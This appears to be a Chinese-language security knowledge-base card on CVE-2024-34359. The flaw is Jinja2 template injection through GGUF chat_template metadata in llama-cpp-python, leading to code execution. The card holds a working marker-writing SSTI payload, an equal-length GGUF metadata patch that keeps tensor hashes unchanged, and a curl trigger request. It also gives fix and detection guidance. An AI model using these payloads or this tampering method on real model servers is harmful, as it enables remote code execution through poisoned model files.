---
id: ai-security-supply-chain-llama-cpp-gguf-chat-template-jinja2-ssti-rce
title: llama-cpp-python GGUF chat_template Jinja2 SSTI：恶意模型元数据在 /v1/chat/completions 触发 RCE（CVE-2024-34359）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: llama-cpp-gguf-chat-template-jinja2-ssti-rce
tags:
- ai-supply-chain
- gguf
- llama-cpp-python
- jinja2
- ssti
- rce
- model-file
- chat-template
- cve-2024-34359
cve:
- CVE-2024-34359
severity: high
confidence: high
status: verified
affected_versions: 0.2.30 至 0.2.71（0.2.72 及以上修复）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V104
  verified_at: '2026-11-05T22:28:01+08:00'
  notes: 已对照原文与37张图核对：0.2.71 下 /v1/chat/completions 触发 marker（图33/34），启动日志显示 Using gguf chat template 为注入模板；0.2.72 返回 SecurityError 且 marker 不存在（图35/36）；GGUF 等长篡改 same_size=True、same_tensor_offset=True、tensor_region_sha256_equal=True、only_metadata_changed=True（图29/30/31），与卡片一致。affected_versions=0.2.30 至 0.2.71（0.2.72+ 修复）与原文表格一致。未验证点：PoC 未本机复跑；frontmatter 无 sources/source_url。
url: /docs/ai-security/supply-chain/ai-security-supply-chain-llama-cpp-gguf-chat-template-jinja2-ssti-rce/
draft: false
kb_aliases:
- CVE-2024-34359
- GHSA-56xg-wfcc-g829
- GGUF 模板注入
- tokenizer.chat_template SSTI
- Jinja2ChatFormatter RCE
- llama-cpp-python 模板注入
- GGUF metadata 等长篡改
- 模型文件攻击面
---

## 一句话结论

llama-cpp-python 0.2.30 ~ 0.2.71 会从 GGUF 的 `tokenizer.chat_template` 元数据读取模型自带聊天模板，并交给未沙箱的 `jinja2.Environment` 编译；攻击者在 GGUF metadata 中写入 `{{ cycler.__init__.__globals__.__builtins__.open(...) }}` 一类 Jinja2 SSTI 载荷，模型可正常加载、服务可正常启动，直到 `/v1/chat/completions` 请求触发模板 `render()` 时以服务进程权限执行任意 Python 代码（CVE-2024-34359）；0.2.72 改用 `ImmutableSandboxedEnvironment` 后，危险属性访问被 `SecurityError` 阻断。

## 原理

- **GGUF metadata 是攻击面**：GGUF 除了 Tensor 权重，还包含大量 metadata KV；其中 `tokenizer.chat_template` 是聊天模板字符串，用于把消息列表格式化成模型 Prompt。它本质上是数据，但会被上层框架当作 Jinja2 模板编译执行。
- **数据流**：`Llama.__init__()` 读取 `self._model.metadata()`；当调用方未显式指定 `chat_format`/`chat_handler` 时，框架取 `self.metadata["tokenizer.chat_template"]`，构造 `Jinja2ChatFormatter(template=..., eos_token=..., bos_token=...)`，并用它作为模型的 `chat_handler`。
- **漏洞点**：受影响版本的 `Jinja2ChatFormatter.__init__()` 使用 `jinja2.Environment(loader=BaseLoader(), trim_blocks=True, lstrip_blocks=True).from_string(self.template)`，这是无沙箱的普通 Jinja2 环境；`__call__` 在聊天请求到来时 `render(messages=...)`，模板中的 Python 对象属性链得以执行。
- **SSTI 载荷**：经典链 `cycler.__init__.__globals__.__builtins__.open(path, 'w').write(data)`，通过 `cycler` 的 `__init__` 函数拿到其 `__globals__`，再访问 Python `__builtins__`，最终调用 `open/write`；也可换成 `os.system`、`subprocess`、`exec` 等。普通环境下模板渲染即产生副作用；`ImmutableSandboxedEnvironment` 会在访问 `__init__`/`__globals__` 时抛 `SecurityError`。
- **延迟触发**：模板在模型初始化时只被编译（`from_string`），真正 `render()` 发生在 Chat Completion 请求路径；因此恶意模型可以正常加载、服务正常启动，检测窗口被推迟到第一次聊天请求。
- **GGUF 等长篡改**：原文只修改 metadata 中的 `tokenizer.chat_template`，不重新训练、不重打包 Tensor：解析 GGUF 头与 metadata KV，定位该字段的 `value_data_offset` 与 `value_data_length`，把新模板写入原字段，剩余空间用空格填充，保持文件总长度和 `tensor_data_start` 不变。验证结果显示文件大小一致、Tensor 起始偏移一致、Tensor 区域 SHA256 一致，只有 metadata 字段变化——这说明“Tensor 哈希一致”不能证明模型文件未被篡改。
- **修复**：0.2.72 把 `jinja2.Environment` 替换为 `jinja2.sandbox.ImmutableSandboxedEnvironment`，限制模板可访问的运行时对象，阻断 `__init__`、`__globals__` 等内部属性链；原文实测同一 `injected.gguf` 在 0.2.72 下返回 `SecurityError: access to attribute '__init__' of 'type' object is unsafe`，marker 不生成。修复不是禁用 GGUF，而是收缩解释器能力边界。
- **沙箱不等于绝对安全**：复杂循环/大规模输出仍可能造成资源消耗；自定义 filter/global/helper 可能重新暴露危险对象；模板引擎与沙箱实现本身仍需持续升级；业务若不需要模型自带模板，应优先使用平台内置模板或严格语法白名单。

## 触发条件

- llama-cpp-python 0.2.30 ~ 0.2.71（0.2.72+ 修复）。
- 服务加载攻击者可控的 GGUF 模型文件；调用方未显式指定 `chat_format`/`chat_handler`，使框架采用模型自带的 `tokenizer.chat_template`。
- GGUF 中存在 `tokenizer.chat_template` 字段，且其原始容量足够写入恶意模板（或攻击者可重新打包 metadata；等长覆盖可保持文件大小）。
- Chat Completion 接口（如 `llama_cpp.server` 的 `/v1/chat/completions`）可达，攻击者能发送一次普通聊天请求触发 `render()`。
- 服务进程具备文件写入、命令执行或网络出站能力（模板可访问 Python 内建对象）。
- 目标未使用 `ImmutableSandboxedEnvironment`/自定义安全模板，也未在加载前对 chat template 做语法白名单或人工审核。

## 利用步骤

1. **获取基线 GGUF**：选择一个包含 `tokenizer.chat_template` 的有效聊天模型，记录文件 SHA256、大小、Tensor 数量、`tensor_data_start`。
2. **解析 metadata**：遍历 GGUF metadata KV，定位 `tokenizer.chat_template` 的 `value_data_offset` 与 `value_data_length`（原文示例 `0x19e534` / `410`）。
3. **构造恶意模板**：写入 Jinja2 SSTI 载荷并通过等长填充保持字段容量；例如：
   ```jinja2
   {% set _ = cycler.__init__.__globals__.__builtins__.open(
       '/tmp/gguf_template_marker.txt', 'w'
   ).write('chat template rendered') %}
   {% for message in messages %}
   {{ message['role'] }}: {{ message['content'] }}
   {% endfor %}
   ```
   实际攻击可将 `open().write` 换成 `os.system`、反弹 shell 或 `exec`。
4. **等长覆盖**：把新模板写回原 metadata 字段，剩余容量用空格填充；保持文件总长度、`tensor_data_start` 与 Tensor 区域不变。
5. **校验篡改隐蔽性**：确认 `same_size=True`、`same_tensor_offset=True`、`tensor_region_sha256_equal=True`、`only_metadata_changed=True`；用 dump 脚本确认目标字段已是恶意模板。
6. **启动服务/加载模型**：`python -m llama_cpp.server --model ./injected.gguf ...`；启动日志会打印 `Using gguf chat template: <恶意模板>`，但服务正常启动。
7. **触发渲染**：向 `/v1/chat/completions` 发送普通消息（如 `{"messages":[{"role":"user","content":"hello"}],"max_tokens":1}`）；模板在构造 Prompt 时渲染，marker/命令执行发生。
8. **修复对照**：在 0.2.72 下加载同一模型并发送同一请求，应返回 `SecurityError` 且 marker 不存在。

## PoC

恶意 Jinja2 模板（只写 marker）：

```jinja2
{% set _ = cycler.__init__.__globals__.__builtins__.open(
    '/tmp/gguf_template_marker.txt',
    'w'
).write('chat template rendered') %}
{% for message in messages %}
{{ message['role'] }}: {{ message['content'] }}
{% endfor %}
```

等长 patch 的核心逻辑（示意）：

```python
# 1) 解析 GGUF magic/version/header，遍历 metadata KV
# 2) 找到 key == "tokenizer.chat_template"
#    记录 value_data_offset、value_data_length
# 3) 新模板长度必须 <= value_data_length
new = Path("marker_template.jinja").read_bytes()
assert len(new) <= capacity
patched = new + b" " * (capacity - len(new))
with open("base.gguf", "rb") as f:
    data = bytearray(f.read())
data[offset:offset + capacity] = patched
Path("injected.gguf").write_bytes(data)
# 文件大小、tensor_data_start、Tensor 区域均不变
```

触发请求：

```bash
python -m llama_cpp.server --model ./injected.gguf --host 127.0.0.1 --port 8000 --n_ctx 512

curl -sS http://127.0.0.1:8000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{"messages":[{"role":"user","content":"hello"}],"max_tokens":1}'

cat /tmp/gguf_template_marker.txt
# chat template rendered
```

原文实测：0.2.71 下 marker 生成，服务日志显示 `Using gguf chat template: {{ cycler.__init__... }}`；0.2.72 下返回 `SecurityError: access to attribute '__init__' of 'type' object is unsafe`，marker 不存在。

## 变体与关联

- **模板载荷变形**：除 `cycler` 外，还可利用模板环境暴露的其他对象/过滤器（如 `lipsum`、自定义 filter）构造属性链；沙箱版本可能仍需关注自定义 helper 暴露面。
- **触发时机**：除 `/v1/chat/completions` 外，任何调用 `chat_handler`/渲染模板的路径（如 `create_chat_completion`、Agent 框架的 Prompt 构造）都可能触发；延迟触发使静态扫描更难发现。
- **等长 metadata 篡改的通用性**：GGUF 的任意 metadata 字符串字段都可用同样方式覆盖，保持文件大小与 Tensor 区域不变；只校验 Tensor 哈希/文件大小的模型准入会被绕过。
- **其他模型格式**：GGUF 的 chat template 是 Jinja2；其他格式可能把模板放在 tokenizer_config.json、config.json 等文件，同样应视为不可信数据。Pickle checkpoint 则是另一条“模型文件→反序列化器”路径。
- **修复绕过**：沙箱不等于绝对安全；若业务注册了自定义 filter/global、允许模板 `import`/`include`，可能重新打开能力边界；应优先使用平台内置模板。
- **关联卡片**：[[ai-security-supply-chain-invokeai-model-install-picklescan-fail-open-rce]]（同一“模型文件攻击面”的 Pickle 分支）、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（恶意模型文件投递面）、[[ai-security-supply-chain-safetensors-duplicate-key-audit-bypass]]（模型文件审计语义差异）。

## 检测与防御

- **升级与沙箱**：升级 llama-cpp-python 到 0.2.72+，确认 `Jinja2ChatFormatter` 使用 `ImmutableSandboxedEnvironment`；不要自行换回普通 `Environment`。
- **模板准入**：把 `tokenizer.chat_template` 当作代码而非数据——加载前做语法树/白名单校验，拒绝 `__init__`、`__globals__`、`__builtins__`、`open`、`system` 等敏感属性/函数；不需要模型自带模板时强制使用平台内置模板。
- **模型文件完整性**：除 Tensor 区域哈希外，还要校验 metadata 区域哈希/签名、文件结构与字段长度；对 GGUF 做字段级 diff，禁止未授权 metadata 修改；使用可信签名/来源。
- **首次加载隔离**：在一次性沙箱中加载外部模型，非 root、无云凭据/SSH Key、默认阻断出站、只读根文件系统、不挂载 Docker Socket；限制 CPU/内存/进程/时间。
- **运行时监控**：告警 `Using gguf chat template` 中出现模板语法/敏感属性、`/v1/chat/completions` 返回 `SecurityError`、模型服务异常子进程与文件写入；记录模型来源、SHA256、metadata 与加载时间。
- **供应链准入**：模型仓库同时检查 checkpoint、tokenizer、config、chat_template 与配套脚本，不只扫描权重文件；对来源、版本、commit、文件清单、哈希、依赖环境做完整准入记录。
